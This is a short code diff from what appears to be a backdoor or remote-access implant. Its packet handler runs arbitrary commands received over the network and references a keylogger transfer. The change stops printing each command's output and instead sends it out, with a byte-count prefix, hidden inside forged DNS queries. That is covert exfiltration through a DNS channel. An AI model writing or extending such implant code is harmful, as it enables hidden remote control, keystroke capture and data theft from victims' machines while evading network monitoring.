@@ -349,7 +349,9 @@ def packet_handler(pkt):
                 transfer_keylogger()
     if argv[0] == EXECUTE:
         result = execute_arbitrary_command(argv[1:])
-        print(f"Result: {result}")
+        num_bytes = len(result.encode("utf-8"))
+        result = "NUM_BYTES:"+str(num_bytes) + " " + result
+        forge_dns_query_block(result, COMMAND_OUTPUT_IDENTIFICATION)
 
 
 MONITOR = FileSystemMonitor()
